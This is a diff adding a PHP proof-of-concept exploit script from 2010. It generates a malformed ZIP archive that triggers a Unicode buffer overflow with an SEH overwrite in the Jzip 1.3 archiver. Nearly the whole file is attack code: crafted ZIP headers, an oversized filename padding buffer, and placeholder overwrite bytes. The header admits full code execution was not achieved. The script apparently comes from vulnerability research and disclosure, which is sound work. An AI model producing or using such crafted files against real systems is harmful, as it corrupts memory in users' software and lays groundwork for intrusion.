@@ -1,0 +1,51 @@
+<?php
+/*
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Jzip v1.3 (.zip) Unicode buffer overflow 0day PoC
+Date: 6/4/2010
+Author: mr_me (http://net-ninja.net/)
+Software Link: http://www.jzip.com/
+Version: 1.3
+Tested on: Windows XP SP3 En
+Advisory: http://www.corelan.be:8800/advisories.php?id=10-021
+Greetz to: Corelan Security Team
+http://www.corelan.be:8800/index.php/security/corelan-team-members/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Note: 
+jzip.exe and all associated modules are compiled with safeseh and combine that
+with the unicode limitation proves very difficult for exploitation. We did not 
+find a working unicode address, otherwise this vulnerability would have been 
+alot more fun! The seven moons were not aligned as Ben puts it :)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Script provided 'as is', without any warranty.
+Use for educational purposes only.
+Do not use this code to do anything illegal !
+
+Note : you are not allowed to edit/modify this code.  
+If you do, Corelan cannot be held responsible for any damages this may cause.
+*/
+
+$lf_header = "\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00";
+
+$cdf_header = "\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00".
+"\x24\x00\x00\x00\x00\x00\x00\x00";
+
+$efcdr_record = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00".
+"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00";
+
+$___offset = 4064;
+$___nseh = str_repeat("\x43",2);
+$___seh = str_repeat("\x44",2);
+
+$___exploit = str_repeat("\x41",810).
+$___nseh.
+$___seh;
+$___exploit .= 
+str_repeat("\x41",$___offset-strlen($___exploit)).
+"\x2e\x74\x78\x74";
+
+$_____b00m = $lf_header.$___exploit.$cdf_header.$___exploit.$efcdr_record;
+file_put_contents("cst-jzip.zip",$_____b00m);
+?>
